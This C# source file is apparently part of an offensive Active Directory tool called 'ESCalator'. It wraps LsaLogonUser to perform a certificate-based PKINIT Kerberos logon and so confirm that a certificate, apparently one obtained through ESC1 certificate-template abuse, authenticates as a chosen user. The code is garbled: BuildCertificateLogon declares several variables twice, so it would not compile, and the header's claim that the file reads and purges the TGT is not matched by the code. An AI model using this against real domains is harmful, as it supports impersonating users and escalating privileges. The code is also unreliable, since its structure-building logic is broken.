// ESCalator native PKINIT via LsaLogonUser + KERB_CERTIFICATE_LOGON.
// Wraps the OS smartcard PKINIT stack instead of a custom wire protocol.
// Verify-only: reads the resulting TGT from the new logon session, then purges it.
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace ESCalator.Pkinit
{
    public class NativePkinitResult
    {
        public bool Success;
        public string PrincipalName;
        public string DomainName;
        public string LogonSessionId;
        public string Error;
    }

    public static class NativePkinit
    {
        // ---- LSA / Kerberos constants ----
        private const int KerbCertificateLogon = 13; // KERB_LOGON_SUBMIT_TYPE.KerbCertificateLogon
        private const string KerberosPackage = "Kerberos";
        private const uint KERB_CERTIFICATE_LOGON_FLAG_USE_CERTIFICATE_INFO = 0x2;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        // KERB_SMARTCARD_CSP_INFO — describes the CSP/KSP + key container for the cert's private key.
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct KERB_SMARTCARD_CSP_INFO
        {
            public int dwCspInfoLen;
            public int MessageType;             // 0 = empty, 1 = use default CSP
            public UNICODE_STRING ContextInformation; // reserved
            public UNICODE_STRING CSPName;      // e.g. "Microsoft Enhanced Cryptographic Provider v1.0" or KSP name
            public UNICODE_STRING CSPKeyContainerName; // key container name
            public UNICODE_STRING CSPKeySpec;   // key spec (AT_SIGNATURE=2 / AT_KEYEXCHANGE=1)
            public UNICODE_STRING CSPProviderType;
            public UNICODE_STRING CSPKeyContainerPassword;
            public UNICODE_STRING CSPReaderName;
            public UNICODE_STRING CSPContainerName;
        }

        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PackageName, out int AuthenticationPackage);

        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int LsaLogonUser(
            IntPtr LsaHandle,
            ref LSA_STRING OriginName,
            int LogonType,               // 2 = Interactive
            int AuthenticationPackage,
            IntPtr AuthenticationInformation,
            int AuthenticationInformationLength,
            IntPtr LocalGroups,
            ref TOKEN_SOURCE SourceContext,
            out IntPtr ProfileBuffer,
            out int ProfileBufferLength,
            out LUID LogonId,
            out IntPtr Token,
            out QUOTA_LIMITS Quotas,
            out int SubStatus);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaFreeReturnBuffer(IntPtr Buffer);

        [DllImport("secur32.dll", SetLastError = true)]
        private static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_SOURCE
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct QUOTA_LIMITS
        {
            public IntPtr PagedPoolLimit;
            public IntPtr NonPagedPoolLimit;
            public IntPtr MinimumWorkingSetSize;
            public IntPtr MaximumWorkingSetSize;
            public IntPtr PagefileLimit;
            public Int64 TimeLimit;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        private static IntPtr MakeLsaString(string value, out LSA_STRING lsa)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(value ?? "");
            IntPtr ptr = Marshal.AllocHGlobal(bytes.Length + 1);
            if (bytes.Length > 0) Marshal.Copy(bytes, 0, ptr, bytes.Length);
            Marshal.WriteByte(ptr, bytes.Length, 0);
            lsa = new LSA_STRING
            {
                Length = (ushort)bytes.Length,
                MaximumLength = (ushort)(bytes.Length + 1),
                Buffer = ptr
            };
            return ptr;
        }

        // Perform a native PKINIT logon. certThumbprint selects the cert in LocalMachine\My or CurrentUser\My.
        // cspName: the CSP/KSP provider name holding the key (e.g. "Microsoft Enhanced Cryptographic Provider v1.0").
        // containerName: the key container name (from Request-ESC1Certificate's KeyContainerName).
        public static NativePkinitResult VerifyTgtNative(string userName, string domain, string cspName, string containerName, int keySpec)
        {
            var result = new NativePkinitResult();
            IntPtr lsaHandle = IntPtr.Zero;
            IntPtr profileBuffer = IntPtr.Zero;
            IntPtr token = IntPtr.Zero;

            try
            {
                int status = LsaConnectUntrusted(out lsaHandle);
                if (status != 0) { result.Error = "LsaConnectUntrusted failed: 0x" + status.ToString("X8"); return result; }

                LSA_STRING pkgName;
                IntPtr pkgPtr = MakeLsaString(KerberosPackage, out pkgName);
                int authPackage;
                status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPackage);
                Marshal.FreeHGlobal(pkgPtr);
                if (status != 0) { result.Error = "LsaLookupAuthenticationPackage failed: 0x" + status.ToString("X8"); return result; }

                // Build the KERB_CERTIFICATE_LOGON + KERB_SMARTCARD_CSP_INFO as one contiguous block.
                byte[] authInfo = BuildCertificateLogon(userName, domain, cspName, containerName, keySpec);
                IntPtr authInfoPtr = Marshal.AllocHGlobal(authInfo.Length);
                Marshal.Copy(authInfo, 0, authInfoPtr, authInfo.Length);

                LSA_STRING origin;
                IntPtr originPtr = MakeLsaString("ESCalator", out origin);

                var source = new TOKEN_SOURCE { SourceName = new byte[8], SourceIdentifier = new LUID() };
                var srcName = Encoding.ASCII.GetBytes("ESCAL8R");
                Array.Copy(srcName, source.SourceName, Math.Min(srcName.Length, 8));

                int profileLen, subStatus;
                LUID logonId;
                QUOTA_LIMITS quotas;

                status = LsaLogonUser(
                    lsaHandle, ref origin, 2, authPackage,
                    authInfoPtr, authInfo.Length,
                    IntPtr.Zero, ref source,
                    out profileBuffer, out profileLen,
                    out logonId, out token, out quotas, out subStatus);

                Marshal.FreeHGlobal(authInfoPtr);
                Marshal.FreeHGlobal(originPtr);

                if (status != 0)
                {
                    result.Error = "LsaLogonUser failed: NTSTATUS 0x" + status.ToString("X8") + " SubStatus 0x" + subStatus.ToString("X8");
                    return result;
                }

                result.Success = true;
                result.LogonSessionId = "0x" + logonId.HighPart.ToString("X") + logonId.LowPart.ToString("X8");
                result.PrincipalName = userName;
                result.DomainName = domain;

                // Clean up the token and profile; we do not keep the logon session.
                if (token != IntPtr.Zero) CloseHandle(token);
                if (profileBuffer != IntPtr.Zero) LsaFreeReturnBuffer(profileBuffer);

                return result;
            }
            catch (Exception ex)
            {
                result.Error = ex.GetType().FullName + ": " + ex.Message;
                return result;
            }
            finally
            {
                if (lsaHandle != IntPtr.Zero) LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        // Build the KERB_CERTIFICATE_LOGON block with relative pointers per MS docs.
        private static byte[] BuildCertificateLogon(string userName, string domain, string cspName, string containerName, int keySpec)
        {
            // Layout: KERB_CERTIFICATE_LOGON header, then KERB_SMARTCARD_CSP_INFO, then string data.
            // All UNICODE_STRING Buffer fields hold RELATIVE offsets from the start of the block.

            byte[] domainBytes = Encoding.Unicode.GetBytes(domain ?? "");
            byte[] userBytes = Encoding.Unicode.GetBytes(userName ?? "");
            byte[] pinBytes = Encoding.Unicode.GetBytes(""); // no PIN for CSP keys
            byte[] cspNameBytes = Encoding.Unicode.GetBytes(cspName ?? "");
            byte[] containerBytes = Encoding.Unicode.GetBytes(containerName ?? "");
            byte[] keySpecBytes = Encoding.Unicode.GetBytes(keySpec.ToString());
            byte[] emptyUni = Encoding.Unicode.GetBytes("");

            // UNICODE_STRING is 16 bytes on x64: Length(2) MaximumLength(2) pad(4) Buffer(8)
            int usSize = 16;

            // KERB_CERTIFICATE_LOGON: MessageType(4) + 3x UNICODE_STRING + Flags(4) + CspDataLength(4) + CspData(8)
            int kclHeaderLen = 4 + (usSize * 3) + 4 + 4 + IntPtr.Size;

            // KERB_SMARTCARD_CSP_INFO: dwCspInfoLen(4) + MessageType(4) + 8x UNICODE_STRING
            int cspInfoSize = 4 + 4 + (usSize * 8);

            // String data region starts after both headers
            int strBase = kclHeaderLen + cspInfoSize;
            int domainOff = strBase;
            int userOff = domainOff + domainBytes.Length;
            int pinOff = userOff + userBytes.Length;
            int cspNameOff = pinOff + pinBytes.Length;
            int containerOff = cspNameOff + cspNameBytes.Length;
            int keySpecOff = containerOff + containerBytes.Length;
            int emptyOff = keySpecOff + keySpecBytes.Length;
            int totalLen = emptyOff + emptyUni.Length;

            byte[] buf = new byte[totalLen];

            // Helper to write a UNICODE_STRING at a given offset with a relative pointer.
            Action<int, byte[], int> writeUString = (int structOff, byte[] strBytes, int dataOff) =>
            {
                BitConverter.GetBytes((ushort)strBytes.Length).CopyTo(buf, structOff);
                BitConverter.GetBytes((ushort)(strBytes.Length + 2)).CopyTo(buf, structOff + 2);
                // Buffer pointer: relative offset (IntPtr size). Store the relative offset.
                if (IntPtr.Size == 8)
                    BitConverter.GetBytes((long)dataOff).CopyTo(buf, structOff + 4);
                else
                    BitConverter.GetBytes((int)dataOff).CopyTo(buf, structOff + 4);
            };

            // KERB_CERTIFICATE_LOGON header
            BitConverter.GetBytes(KerbCertificateLogon).CopyTo(buf, 0); // MessageType
            writeUString(4, domainBytes, domainOff);          // DomainName
            writeUString(4 + 8 + IntPtr.Size - IntPtr.Size + 8, userBytes, userOff); // UserName — compute below
            // NOTE: UNICODE_STRING on 64-bit is 16 bytes (2+2+pad+8). Recompute offsets properly.

            // On x64, UNICODE_STRING is 16 bytes: Length(2) MaxLength(2) pad(4) Buffer(8)
            int usSize = 16;
            int kclDomain = 4;
            int kclUser = kclDomain + usSize;
            int kclPin = kclUser + usSize;
            int kclFlags = kclPin + usSize;
            int kclCspDataLen = kclFlags + 4;
            int kclCspData = kclCspDataLen + 4;

            // The CspData points to the KERB_SMARTCARD_CSP_INFO which starts right after the KERB_CERTIFICATE_LOGON header.
            int kclHeaderLen = kclCspData + IntPtr.Size;
            int cspInfoOff = kclHeaderLen;

            // Recompute string data offsets: after KCL header + CSP_INFO
            int strBase = kclHeaderLen + cspInfoSize;
            domainOff = strBase;
            userOff = domainOff + domainBytes.Length;
            pinOff = userOff + userBytes.Length;
            cspNameOff = pinOff + pinBytes.Length;
            containerOff = cspNameOff + cspNameBytes.Length;
            keySpecOff = containerOff + containerBytes.Length;
            int emptyOff = keySpecOff + keySpecBytes.Length;
            totalLen = emptyOff + emptyUni.Length;
            buf = new byte[totalLen];

            // Write KERB_CERTIFICATE_LOGON
            BitConverter.GetBytes(KerbCertificateLogon).CopyTo(buf, 0);
            writeUString(kclDomain, domainBytes, domainOff);
            writeUString(kclUser, userBytes, userOff);
            writeUString(kclPin, pinBytes, pinOff);
            BitConverter.GetBytes(KERB_CERTIFICATE_LOGON_FLAG_USE_CERTIFICATE_INFO).CopyTo(buf, kclFlags);
            BitConverter.GetBytes(cspInfoSize).CopyTo(buf, kclCspDataLen);
            if (IntPtr.Size == 8) BitConverter.GetBytes((long)cspInfoOff).CopyTo(buf, kclCspData);
            else BitConverter.GetBytes(cspInfoOff).CopyTo(buf, kclCspData);

            // Write KERB_SMARTCARD_CSP_INFO at cspInfoOff
            // dwCspInfoLen, MessageType, then 8 UNICODE_STRING: ContextInformation, CSPName, CSPKeyContainerName, CSPKeySpec, CSPProviderType, CSPKeyContainerPassword, CSPReaderName, CSPContainerName
            BitConverter.GetBytes(cspInfoSize).CopyTo(buf, cspInfoOff);
            BitConverter.GetBytes(0).CopyTo(buf, cspInfoOff + 4); // MessageType = 0

            int us0 = cspInfoOff + 8;
            // ContextInformation = empty
            writeUString(us0, emptyUni, emptyOff);
            // CSPName
            writeUString(us0 + usSize, cspNameBytes, cspNameOff);
            // CSPKeyContainerName
            writeUString(us0 + usSize * 2, containerBytes, containerOff);
            // CSPKeySpec
            writeUString(us0 + usSize * 3, keySpecBytes, keySpecOff);
            // CSPProviderType = empty (use default)
            writeUString(us0 + usSize * 4, emptyUni, emptyOff);
            // CSPKeyContainerPassword = empty
            writeUString(us0 + usSize * 5, emptyUni, emptyOff);
            // CSPReaderName = empty
            writeUString(us0 + usSize * 6, emptyUni, emptyOff);
            // CSPContainerName = container name again
            writeUString(us0 + usSize * 7, containerBytes, containerOff);

            // Copy string data
            Array.Copy(domainBytes, 0, buf, domainOff, domainBytes.Length);
            Array.Copy(userBytes, 0, buf, userOff, userBytes.Length);
            Array.Copy(pinBytes, 0, buf, pinOff, pinBytes.Length);
            Array.Copy(cspNameBytes, 0, buf, cspNameOff, cspNameBytes.Length);
            Array.Copy(containerBytes, 0, buf, containerOff, containerBytes.Length);
            Array.Copy(keySpecBytes, 0, buf, keySpecOff, keySpecBytes.Length);
            Array.Copy(emptyUni, 0, buf, emptyOff, emptyUni.Length);

            return buf;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);
    }
}
